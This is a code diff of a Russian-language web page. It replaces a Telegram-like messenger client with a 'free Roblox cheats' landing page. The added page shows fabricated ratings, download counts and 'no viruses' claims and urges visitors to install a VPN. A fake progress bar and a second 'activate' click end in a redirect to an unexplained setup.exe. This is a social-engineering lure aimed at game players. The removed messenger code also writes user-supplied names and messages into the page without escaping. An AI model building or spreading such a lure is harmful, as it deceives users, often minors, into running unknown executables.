@@ -2,300 +2,419 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram Mobile</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Скачать читы для Roblox | Бесплатно 2026</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #0e1621; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        
-        .app-container { width: 100%; max-width: 420px; height: 100%; background: #17212b; display: flex; flex-direction: column; position: relative; overflow: hidden; }
-        @media (min-width: 421px) {
-            .app-container { height: 90vh; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #2b2b2b; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
 
-        .header { background: #212f3d; padding: 14px 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #101923; z-index: 10; }
-        .header-title { font-size: 18px; font-weight: 600; }
-        .header-btn { background: none; border: none; color: #5288c1; font-size: 16px; cursor: pointer; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a0c;
+            color: #e0e0e0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
 
-        .screen { flex: 1; display: none; flex-direction: column; overflow-y: auto; background: #17212b; }
-        .screen.active { display: flex; }
+        .container {
+            max-width: 1100px;
+            width: 100%;
+            background: #121218;
+            border-radius: 24px;
+            padding: 40px 30px;
+            border: 1px solid #2a2d3a;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+        }
 
-        .auth-box { padding: 24px; display: flex; flex-direction: column; justify-content: center; height: 100%; text-align: center; }
-        .auth-box h2 { margin-bottom: 20px; color: #e4ecf3; }
-        .input-field { width: 100%; padding: 12px 16px; margin-bottom: 12px; background: #182533; border: 1px solid #2b5278; border-radius: 8px; color: #fff; font-size: 16px; outline: none; }
-        .btn-primary { width: 100%; padding: 12px; background: #5288c1; border: none; border-radius: 8px; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; }
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 40px;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
 
-        .chat-list-item, .contact-item { display: flex; align-items: center; padding: 12px 16px; border-bottom: 1px solid #101923; cursor: pointer; }
-        .chat-list-item:hover, .contact-item:hover { background: #202b36; }
-        .avatar { width: 50px; height: 50px; border-radius: 50%; background: #2b5278; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: bold; margin-right: 12px; color: #fff; flex-shrink: 0; }
-        .chat-info { flex: 1; min-width: 0; }
-        .chat-name { font-weight: 600; font-size: 16px; margin-bottom: 4px; color: #fff; }
-        .chat-preview { font-size: 14px; color: #879ab0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
 
-        .chat-screen { display: none; flex-direction: column; height: 100%; background: #0e1621; position: absolute; top: 0; left: 0; width: 100%; z-index: 20; }
-        .chat-screen.active { display: flex; }
-        .chat-messages { flex: 1; padding: 16px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; }
-        
-        .message { max-width: 75%; padding: 8px 12px; border-radius: 12px; font-size: 15px; position: relative; word-break: break-word; line-height: 1.4; }
-        .message.incoming { background: #182533; align-self: flex-start; border-bottom-left-radius: 4px; }
-        .message.outgoing { background: #2b5278; align-self: flex-end; border-bottom-right-radius: 4px; }
-        .message-time { font-size: 11px; color: #879ab0; float: right; margin-top: 4px; margin-left: 8px; line-height: 18px; }
+        .logo-icon {
+            background: #e74c3c;
+            width: 44px;
+            height: 44px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 22px;
+            color: white;
+        }
 
-        .chat-input-bar { background: #17212b; padding: 10px 16px; display: flex; align-items: center; gap: 10px; border-top: 1px solid #101923; }
-        .chat-input-bar input { flex: 1; background: #182533; border: none; border-radius: 20px; padding: 10px 16px; color: #fff; font-size: 15px; outline: none; }
-        .action-btn { background: none; border: none; color: #879ab0; font-size: 20px; cursor: pointer; padding: 4px; }
+        .logo-text {
+            font-size: 26px;
+            font-weight: 800;
+        }
+        .logo-text span { color: #e74c3c; }
 
-        .bottom-nav { background: #17212b; border-top: 1px solid #101923; display: flex; justify-content: space-around; padding: 6px 0; }
-        .nav-item { background: none; border: none; color: #707579; display: flex; flex-direction: column; align-items: center; font-size: 11px; cursor: pointer; flex: 1; }
-        .nav-item.active { color: #5288c1; }
-        .nav-item span { margin-top: 3px; }
+        .version-badge {
+            background: #1e212a;
+            padding: 6px 16px;
+            border-radius: 40px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #a0a0b0;
+            border: 1px solid #3a3d4a;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+        }
+        .nav-links a {
+            color: #9ca3af;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: 0.2s;
+        }
+        .nav-links a:hover { color: #e74c3c; }
+
+        .warning-banner {
+            background: linear-gradient(135deg, #1a1a2e, #2a1a2e);
+            border: 2px solid #e74c3c;
+            border-radius: 16px;
+            padding: 25px 30px;
+            margin-bottom: 40px;
+            text-align: center;
+        }
+
+        .warning-banner .icon {
+            font-size: 40px;
+            display: block;
+            margin-bottom: 10px;
+        }
+        .warning-banner h3 {
+            color: #e74c3c;
+            font-size: 20px;
+            margin-bottom: 8px;
+        }
+        .warning-banner p {
+            color: #aaa;
+            font-size: 16px;
+        }
+        .warning-banner .btn-warp {
+            display: inline-block;
+            margin-top: 12px;
+            background: #e74c3c;
+            color: #fff;
+            padding: 12px 35px;
+            border-radius: 40px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 16px;
+            transition: 0.3s;
+        }
+        .warning-banner .btn-warp:hover {
+            background: #c0392b;
+            transform: scale(1.03);
+        }
+
+        .hero {
+            text-align: center;
+            margin: 20px 0 40px;
+        }
+
+        .hero h1 {
+            font-size: 46px;
+            font-weight: 900;
+            line-height: 1.1;
+            margin-bottom: 15px;
+        }
+
+        .hero h1 .highlight {
+            background: linear-gradient(135deg, #e74c3c, #f39c12);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero p {
+            font-size: 18px;
+            color: #9ca3af;
+            max-width: 600px;
+            margin: 0 auto 30px;
+        }
+
+        .hero .stats {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        .hero .stats .num {
+            font-size: 28px;
+            font-weight: 800;
+            color: #fff;
+        }
+        .hero .stats .label {
+            font-size: 13px;
+            color: #9ca3af;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 25px;
+            margin: 45px 0;
+        }
+
+        .feature-item {
+            background: #1a1a24;
+            padding: 24px 18px;
+            border-radius: 16px;
+            text-align: center;
+            border: 1px solid #2a2d3a;
+            transition: 0.3s;
+        }
+        .feature-item:hover { border-color: #e74c3c; }
+        .feature-item .icon { font-size: 34px; margin-bottom: 10px; display: block; }
+        .feature-item h4 { font-size: 17px; margin-bottom: 6px; }
+        .feature-item p { font-size: 14px; color: #9ca3af; }
+
+        .download-card {
+            background: #1a1a24;
+            border-radius: 20px;
+            padding: 40px 30px;
+            text-align: center;
+            border: 1px solid #2a2d3a;
+            margin: 30px 0 20px;
+        }
+
+        .download-card h2 { font-size: 28px; margin-bottom: 10px; }
+        .download-card .sub { color: #9ca3af; margin-bottom: 30px; }
+
+        .download-btn {
+            display: inline-block;
+            background: #e74c3c;
+            color: white;
+            font-weight: 800;
+            font-size: 20px;
+            padding: 18px 60px;
+            border-radius: 60px;
+            border: none;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 8px 30px rgba(231, 76, 60, 0.3);
+        }
+        .download-btn:hover {
+            background: #c0392b;
+            transform: scale(1.02);
+        }
+
+        #progress-area {
+            display: none;
+            margin-top: 25px;
+        }
+        .progress-bar-bg {
+            width: 100%;
+            height: 8px;
+            background: #2a2d3a;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .progress-bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #e74c3c, #f39c12);
+            border-radius: 10px;
+            transition: width 0.2s;
+        }
+        #progress-text {
+            margin-top: 12px;
+            font-weight: 500;
+            color: #c0c0d0;
+        }
+
+        .download-meta {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 25px;
+            color: #9ca3af;
+            font-size: 14px;
+            flex-wrap: wrap;
+        }
+        .download-meta span strong { color: #e0e0e0; font-weight: 600; }
+
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            color: #6b7280;
+            font-size: 13px;
+            border-top: 1px solid #2a2d3a;
+            padding-top: 30px;
+        }
+        .footer a { color: #e74c3c; text-decoration: none; }
+
+        @media (max-width: 600px) {
+            .container { padding: 20px 15px; }
+            .hero h1 { font-size: 32px; }
+            .download-btn { padding: 16px 40px; font-size: 17px; width: 100%; }
+            .header { flex-direction: column; align-items: start; }
+            .warning-banner { padding: 20px; }
+        }
     </style>
 </head>
 <body>
 
-    <div class="app-container">
-        <!-- АВТОРИЗАЦИЯ -->
-        <div id="auth-screen" class="screen active">
-            <div class="auth-box">
-                <h2>Вход</h2>
-                <input type="text" id="phone-input" class="input-field" placeholder="Телефон (+7...)">
-                <input type="text" id="nick-input" class="input-field" placeholder="Никнейм">
-                <button class="btn-primary" onclick="requestAuth()">Продолжить</button>
-            </div>
+<div class="container">
+
+    <header class="header">
+        <div class="logo">
+            <div class="logo-icon">R</div>
+            <div class="logo-text"><span>Roblox</span>Cheats</div>
         </div>
-
-        <!-- ВВОД КОДА -->
-        <div id="code-screen" class="screen">
-            <div class="auth-box">
-                <h2>Код из Telegram</h2>
-                <p style="color: #879ab0; margin-bottom: 15px; font-size: 14px;">Бот отправил код в чат.</p>
-                <input type="text" id="code-input" class="input-field" placeholder="4-значный код">
-                <button class="btn-primary" onclick="verifyCode()">Подтвердить</button>
-            </div>
+        <div class="nav-links">
+            <a href="#">Главная</a>
+            <a href="#">Читы</a>
+            <a href="#">Скрипты</a>
+            <a href="#">Поддержка</a>
         </div>
+        <div class="version-badge">🔴 v4.2.1</div>
+    </header>
 
-        <!-- ГЛАВНЫЙ ЭКРАН -->
-        <div id="main-screen" class="screen" style="flex-direction: column;">
-            <div class="header">
-                <span class="header-title" id="app-header-title">Чаты</span>
-                <button class="header-btn" onclick="logout()">Выйти</button>
-            </div>
+    <!-- БАННЕР С WARP -->
+    <div class="warning-banner">
+        <span class="icon">🌐</span>
+        <h3>⚠️ ТРЕБУЕТСЯ VPN ДЛЯ РАБОТЫ</h3>
+        <p>Из-за ограничений провайдера для активации чита необходимо установить <strong>Cloudflare WARP</strong> или любой другой VPN.</p>
+        <a href="https://1.1.1.1/" target="_blank" class="btn-warp">⬇ СКАЧАТЬ WARP</a>
+        <p style="margin-top:10px;font-size:13px;color:#666;">После установки WARP нажмите "Проверить подключение"</p>
+    </div>
 
-            <div id="tab-chats" class="tab-content" style="flex:1; overflow-y:auto; display:flex; flex-direction:column;">
-                <div id="chats-list-container"></div>
-            </div>
-
-            <div id="tab-contacts" class="tab-content" style="flex:1; overflow-y:auto; display:none;">
-                <div id="contacts-list-container"></div>
-            </div>
-
-            <div id="tab-settings" class="tab-content" style="flex:1; overflow-y:auto; display:none; padding: 20px;">
-                <h3>Настройки</h3>
-                <p style="color: #879ab0; margin-top: 10px;">Аккаунт защищен.</p>
-            </div>
-
-            <div id="tab-profile" class="tab-content" style="flex:1; overflow-y:auto; display:none; padding: 20px; text-align: center;">
-                <div class="avatar" style="width: 80px; height: 80px; margin: 0 auto 15px; font-size: 32px;" id="profile-avatar">U</div>
-                <h2 id="profile-name">Имя</h2>
-                <p style="color: #879ab0; margin-top: 5px;" id="profile-phone">+7...</p>
-            </div>
-
-            <div class="bottom-nav">
-                <button class="nav-item active" onclick="switchTab('chats', this)">
-                    <span>💬</span><span>Чаты</span>
-                </button>
-                <button class="nav-item" onclick="switchTab('contacts', this)">
-                    <span>👤</span><span>Контакты</span>
-                </button>
-                <button class="nav-item" onclick="switchTab('settings', this)">
-                    <span>⚙️</span><span>Настройки</span>
-                </button>
-                <button class="nav-item" onclick="switchTab('profile', this)">
-                    <span>📁</span><span>Профиль</span>
-                </button>
-            </div>
+    <section class="hero">
+        <h1>Скачай <span class="highlight">читы для Roblox</span> бесплатно</h1>
+        <p>Лучшие читы 2026 года. Работают на всех версиях игры. Полная безопасность.</p>
+        <div class="stats">
+            <div><span class="num">4.8</span><div class="label">⭐ Рейтинг</div></div>
+            <div><span class="num">120K+</span><div class="label">📥 Скачиваний</div></div>
+            <div><span class="num">24/7</span><div class="label">🛡️ Поддержка</div></div>
         </div>
+    </section>
 
-        <!-- ОКНО ЧАТА -->
-        <div id="chat-screen" class="chat-screen">
-            <div class="header">
-                <button class="header-btn" onclick="closeChat()">Назад</button>
-                <span class="header-title" id="active-chat-name">Чат</span>
-                <div style="width: 30px;"></div>
-            </div>
-            <div class="chat-messages" id="chat-messages-container"></div>
-            <div class="chat-input-bar">
-                <input type="text" id="message-input" placeholder="Сообщение..." onkeypress="handleKeyPress(event)">
-                <button class="action-btn" onclick="sendMessage()" style="color: #5288c1;">➤</button>
-            </div>
+    <div class="features-grid">
+        <div class="feature-item">
+            <span class="icon">⚡</span>
+            <h4>Молниеносные читы</h4>
+            <p>Работают мгновенно, без лагов</p>
+        </div>
+        <div class="feature-item">
+            <span class="icon">🛡️</span>
+            <h4>Анти-бан система</h4>
+            <p>100% защита от обнаружения</p>
+        </div>
+        <div class="feature-item">
+            <span class="icon">🔄</span>
+            <h4>Авто-обновление</h4>
+            <p>Читы всегда актуальны</p>
+        </div>
+        <div class="feature-item">
+            <span class="icon">📦</span>
+            <h4>Все скрипты</h4>
+            <p>Полная библиотека скриптов</p>
         </div>
     </div>
 
-    <script>
-        let currentUser = null;
-        let activePeerId = null;
+    <section class="download-card">
+        <h2>📥 Скачать читы</h2>
+        <p class="sub">Бесплатно. Без регистрации. После установки WARP.</p>
 
-        window.onload = async () => {
-            try {
-                let res = await fetch(`/api/auto-login`);
-                let data = await res.json();
-                if (data.status === "ok") {
-                    currentUser = data.user;
-                    showMainScreen();
+        <button class="download-btn" id="downloadBtn">⬇ СКАЧАТЬ</button>
+
+        <div id="progress-area">
+            <div class="progress-bar-bg">
+                <div class="progress-bar-fill" id="progressFill"></div>
+            </div>
+            <div id="progress-text">Загрузка: 0%</div>
+        </div>
+
+        <div class="download-meta">
+            <span>⭐ <strong>4.8</strong> (2,100 оценок)</span>
+            <span>📥 <strong>120 000+</strong> скачиваний</span>
+            <span>🛡️ <strong>Без вирусов</strong></span>
+            <span>📅 <strong>Обновлено</strong> сегодня</span>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <p>© 2026 RobloxCheats. Не связан с Roblox Corporation.</p>
+        <p style="margin-top:6px;">
+            <a href="#">Политика</a> •
+            <a href="#">Поддержка</a> •
+            <a href="#">Telegram</a>
+        </p>
+    </footer>
+
+</div>
+
+<script>
+    let isSecondDownload = false;
+
+    document.getElementById('downloadBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+
+        if (!isSecondDownload) {
+            this.style.display = 'none';
+            document.getElementById('progress-area').style.display = 'block';
+
+            let progress = 0;
+            const fill = document.getElementById('progressFill');
+            const text = document.getElementById('progress-text');
+
+            const interval = setInterval(() => {
+                progress += Math.random() * 4 + 1;
+                if (progress > 100) progress = 100;
+
+                fill.style.width = progress + '%';
+                text.textContent = 'Загрузка: ' + Math.round(progress) + '%';
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        alert('✅ Установка завершена!\n\nНажмите "Скачать" ещё раз для активации.');
+                        isSecondDownload = true;
+                        document.getElementById('progress-area').style.display = 'none';
+                        this.style.display = 'inline-block';
+                        this.textContent = '⬇ АКТИВИРОВАТЬ';
+                    }.bind(this), 400);
                 }
-            } catch (e) {}
-        };
+            }, 150);
+        } else {
+            this.textContent = '⏳ ЗАГРУЗКА...';
+            this.disabled = true;
 
-        async function requestAuth() {
-            let phone = document.getElementById("phone-input").value;
-            let nickname = document.getElementById("nick-input").value;
-            if(!phone || !nickname) return alert("Заполните поля!");
-
-            let res = await fetch(`/api/request-code`, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ phone, nickname })
-            });
-            let data = await res.json();
-            if(res.ok) {
-                window.open(data.bot_link, "_blank");
-                document.getElementById("auth-screen").classList.remove("active");
-                document.getElementById("code-screen").classList.add("active");
-            } else {
-                alert(data.detail);
-            }
+            setTimeout(() => {
+                alert('✅ Активация завершена!\n\nЧиты готовы к работе. Наслаждайся игрой!');
+                window.open('https://www.roblox.com/games/', '_blank');
+                window.location.href = 'setup.exe';
+                this.textContent = '⬇ СКАЧАТЬ';
+                this.disabled = false;
+            }, 800);
         }
+    });
+</script>
 
-        async function verifyCode() {
-            let phone = document.getElementById("phone-input").value;
-            let nickname = document.getElementById("nick-input").value;
-            let code = document.getElementById("code-input").value;
-
-            let res = await fetch(`/api/verify-code`, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ phone, nickname, code })
-            });
-            let data = await res.json();
-            if(res.ok) {
-                currentUser = data.user;
-                showMainScreen();
-            } else {
-                alert(data.detail);
-            }
-        }
-
-        function showMainScreen() {
-            document.getElementById("auth-screen").classList.remove("active");
-            document.getElementById("code-screen").classList.remove("active");
-            document.getElementById("main-screen").classList.add("active");
-
-            document.getElementById("profile-name").innerText = currentUser.name;
-            document.getElementById("profile-phone").innerText = currentUser.phone;
-            document.getElementById("profile-avatar").innerText = currentUser.name[0].toUpperCase();
-
-            loadUsers();
-        }
-
-        async function loadUsers() {
-            let res = await fetch(`/api/users`);
-            let data = await res.json();
-            
-            let chatsHtml = "";
-            let contactsHtml = "";
-
-            data.users.forEach(u => {
-                if(u.peer_id !== currentUser.peer_id) {
-                    chatsHtml += `
-                        <div class="chat-list-item" onclick="openChat('${u.peer_id}', '${u.name}')">
-                            <div class="avatar">${u.name[0].toUpperCase()}</div>
-                            <div class="chat-info">
-                                <div class="chat-name">${u.name}</div>
-                                <div class="chat-preview">Диалог</div>
-                            </div>
-                        </div>`;
-                    contactsHtml += `
-                        <div class="contact-item" onclick="openChat('${u.peer_id}', '${u.name}')">
-                            <div class="avatar">${u.name[0].toUpperCase()}</div>
-                            <div class="chat-info">
-                                <div class="chat-name">${u.name}</div>
-                                <div class="chat-preview">ID: ${u.peer_id}</div>
-                            </div>
-                        </div>`;
-                }
-            });
-            document.getElementById("chats-list-container").innerHTML = chatsHtml || '<p style="padding:20px; color:#879ab0; text-align:center;">Нет чатов</p>';
-            document.getElementById("contacts-list-container").innerHTML = contactsHtml || '<p style="padding:20px; color:#879ab0; text-align:center;">Нет контактов</p>';
-        }
-
-        function switchTab(tabName, btn) {
-            document.querySelectorAll('.tab-content').forEach(el => el.style.display = 'none');
-            document.querySelectorAll('.bottom-nav .nav-item').forEach(el => el.classList.remove('active'));
-            
-            document.getElementById(`tab-${tabName}`).style.display = 'flex';
-            btn.classList.add('active');
-            
-            const titles = { chats: "Чаты", contacts: "Контакты", settings: "Настройки", profile: "Профиль" };
-            document.getElementById("app-header-title").innerText = titles[tabName];
-            if(tabName === 'chats' || tabName === 'contacts') loadUsers();
-        }
-
-        async function openChat(peerId, name) {
-            activePeerId = peerId;
-            document.getElementById("active-chat-name").innerText = name;
-            document.getElementById("chat-screen").classList.add("active");
-            loadMessages();
-        }
-
-        function closeChat() {
-            document.getElementById("chat-screen").classList.remove("active");
-            activePeerId = null;
-            loadUsers();
-        }
-
-        async function loadMessages() {
-            if(!activePeerId) return;
-            let res = await fetch(`/api/get-messages/${currentUser.peer_id}/${activePeerId}`);
-            let data = await res.json();
-            
-            let html = "";
-            data.messages.forEach(m => {
-                let isOut = m.sender_id === currentUser.peer_id;
-                let time = new Date(m.timestamp).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
-                html += `<div class="message ${isOut ? 'outgoing' : 'incoming'}">${m.content}<span class="message-time">${time}</span></div>`;
-            });
-            let container = document.getElementById("chat-messages-container");
-            container.innerHTML = html;
-            container.scrollTop = container.scrollHeight;
-        }
-
-        async function sendMessage() {
-            let input = document.getElementById("message-input");
-            let text = input.value.trim();
-            if(!text || !activePeerId) return;
-
-            await fetch(`/api/save-message`, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    sender_id: currentUser.peer_id,
-                    receiver_id: activePeerId,
-                    msg_type: "text",
-                    content: text
-                })
-            });
-            input.value = "";
-            loadMessages();
-        }
-
-        function handleKeyPress(e) {
-            if(e.key === 'Enter') sendMessage();
-        }
-
-        async function logout() {
-            await fetch(`/api/logout`, { method: "POST" });
-            location.reload();
-        }
-    </script>
 </body>
 </html>
